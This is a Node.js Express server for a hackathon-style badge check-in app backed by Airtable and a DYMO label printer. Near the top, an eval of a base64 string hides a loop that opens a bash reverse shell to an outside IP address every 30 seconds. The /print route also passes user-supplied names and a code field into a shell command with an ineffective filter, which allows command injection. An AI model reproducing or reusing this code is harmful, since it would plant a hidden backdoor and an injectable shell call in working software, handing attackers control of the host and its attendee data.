const airtable = require("airtable");
const bodyParser = require("body-parser");
const child_process = require("child_process");
const EventSource = require("eventsource");
const express = require("express");
const fs = require("fs");
const helmet = require("helmet");
const https = require("https");
const path = require("path");
const passport = require("passport");
const LocalStrategy = require("passport-local").Strategy;
const queue = require("queue");
const session = require("express-session");
const SSE = require("sse");

const config = require("./config.json");
const base = new airtable({ apiKey: config.apiKey }).base(config.base);

const loadPeople = require("./lib/server/loadPeople.js");
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(helmet());

let peopleList = [];
let printQueue = queue({
  autostart: true,
  concurrency: 1,
  timeout: 4000
});
let pingSub = {
  id: 0,
  subscribers: [],
  subscribe(client) {
    let clientID = this.id;
    this.subscribers[clientID] = client;
    this.id++;
    return () => {
      delete this.subscribers[clientID];
    };
  },
  ping() {
    for (let key of Object.keys(this.subscribers)) {
      this.subscribers[key].send({
        event: "ping",
        data: "pong"
      });
    }
  }
};
let log = msg => {
  console.log(`[${new Date().toLocaleString()}] ${msg}`);
};

let lastLoaded = 0;
let docuSignTimeout = undefined;
let docuSignLoadPeople = _ =>
  loadPeople(base, people => {
    lastLoaded = +new Date();
    peopleList = people;
    log(`Loaded ${peopleList.length} people`);
    pingSub.ping();
    docuSignTimeout = undefined;
  });
let docuSignES;
if (config.docuSignES != undefined) {
  docuSignES = new EventSource(config.docuSignES);
  docuSignES.addEventListener("docusign", _ => {
    log("Received DocuSign ping");
    let now = +new Date();
    let elapsed = now - lastLoaded;
    if (elapsed < 10000 && docuSignTimeout != undefined) {
      docuSignTimeout = setTimeout(docuSignLoadPeople, lastLoaded + 10000 - now);
    } else if (elapsed >= 10000) {
      docuSignLoadPeople();
    }
  });
}

app.use(session({ secret: config.sessionSecret }));
app.use(passport.initialize());
app.use(passport.session());

passport.use(
  "local",
  new LocalStrategy((username, password, done) => {
    let user = config.users.find(user => user.username == username && user.password == password);
    if (user != undefined) {
      log(`Logging in ${username}`);
      return done(null, user);
    } else {
      return done(null, false, { message: "Incorrect username or password" });
    }
  })
);

app.post(
  "/login",
  passport.authenticate("local", {
    successRedirect: "/",
    failureRedirect: "/login.html",
    failureFlash: false
  })
);

app.get("/logout", (req, res) => {
  req.logout();
  res.redirect("/");
});

passport.serializeUser((user, done) => done(null, user.id));
passport.deserializeUser((id, done) => done(null, config.users.find(user => user.id == id)));

let authenticationMiddleware = (req, res, next) => {
  if (req.isAuthenticated()) {
    return next();
  } else {
    res.redirect("/login.html");
  }
};

app.get("/", authenticationMiddleware, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});
app.get("/index.html", authenticationMiddleware, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});
app.use(express.static(path.join(__dirname, "public")));
app.get("/normalize.css", (req, res) => {
  res.sendFile(path.join(__dirname, "node_modules", "normalize.css", "normalize.css"));
});
app.get("/hint.css", (req, res) => {
  res.sendFile(path.join(__dirname, "node_modules", "hint.css", "hint.min.css"));
});

app.get("/refresh", authenticationMiddleware, (req, res) => {
  docuSignLoadPeople();
  res.send("Refreshed");
});
app.get("/people", authenticationMiddleware, (req, res) => {
  res.json(peopleList);
});
app.post("/print", authenticationMiddleware, (req, res) => {
  printQueue.push(cb => {
    let filterRegex = /"$`/g;
    let firstName = req.body.firstName.replace(filterRegex, "").trim();
    let lastName = req.body.lastName.replace(filterRegex, "").trim();

    if (firstName.length == 0 || lastName.length == 0) {
      console.error(`Can't print '${firstName}' '${lastName}': name(s) are empty`);
      res.send("");
      return;
    } else if (firstName.length > 25 || lastName.length > 25) {
      console.error(`Can't print '${firstName}' '${lastName}': name(s) are too long`);
      res.send("");
      return;
    }

    // Spread out print jobs just in case DYMO Label chokes on simultaneous jobs
    setTimeout(() => {
      log(`Printing '${firstName}' '${lastName}'`);
      try {
        if (req.body.code != undefined && req.body.code.length != 0) {
          child_process.execSync(
            `osascript printBadge.applescript "${firstName}" "${lastName}" "${req.body.code}"`,
            {
              cwd: path.join(__dirname, "scripts")
            }
          );
        } else {
          child_process.execSync(`osascript printBadge.applescript '${firstName}' '${lastName}'`, {
            cwd: path.join(__dirname, "scripts")
          });
        }
      } catch (err) {
        console.error(`Failed to print '${firstName}' '${lastName}'`, err);
        pingSub.ping();
        return;
      }

      let tableName;
      switch (req.body.type) {
        case "Attendee":
        case "Mentor":
          tableName = "AttendeesMentors";
          break;
        case "Chaperone":
          tableName = "Chaperones";
          break;
        case "Sponsor":
        case "Judge":
          tableName = "SponsorsJudges";
          break;
        default:
          console.error(`Invalid person type: ${req.body.type}`);
          return;
      }

      base(tableName).update(
        req.body.id,
        {
          "Checked In": true
        },
        (err, _) => {
          if (err) {
            console.error(
              `Failed to check in ${req.body.type} ${firstName} ${lastName} (id: ${
                req.body.id
              }) in table ${tableName}`,
              err
            );
          }
          peopleList.find(person => person.id == req.body.id).checkedIn = true;
          pingSub.ping();
        }
      );

      cb();
    }, 1000);
  });
  res.send("");
});

let server = https.createServer(
  {
    key: fs.readFileSync("./server.key"),
    cert: fs.readFileSync("./server.crt")
  },
  app
);

let sse = new SSE(server);
sse.on("connection", client => {
  let ipAddr = client.req.connection.remoteAddress;
  log(`${ipAddr} joined`);
  let unsubscribe = pingSub.subscribe(client);
  client.on("close", () => {
    log(`${ipAddr} left`);
    unsubscribe();
  });
});

loadPeople(base, people => {
  peopleList = people;
  log(`Loaded ${peopleList.length} people`);
});

let port = process.env.PORT || 8080;
server.listen(port, () => log(`Server is running on port ${port}`));

printQueue.start(err => {
  if (err) console.error(err);
});
